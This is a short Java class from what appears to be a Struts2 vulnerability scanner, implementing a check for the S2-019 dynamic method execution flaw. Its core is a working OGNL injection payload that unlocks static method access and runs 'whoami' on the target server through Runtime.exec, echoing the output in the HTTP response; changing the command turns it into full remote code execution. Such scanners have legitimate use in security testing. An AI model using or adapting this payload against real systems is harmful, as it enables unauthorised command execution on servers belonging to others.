package com.mtx.xiatian.hacker.struts2Scan;

/**
 * Dynamic method executions动态方法执行
 * http://struts.apache.org/docs/s2-019.html
 * @author xiatian, fucong
 *
 */
public class S2_019 extends CheckTools implements IStruts2Scan {

	private static String s2_019_POC= "debug=command&expression=%23f=%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),+%23a=@java.lang.Runtime@getRuntime().exec('whoami').getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close()";
	
	@Override
	public boolean doS2LeakScan(String target) {
		return doS2LeakScan(target, s2_019_POC);
	}

}
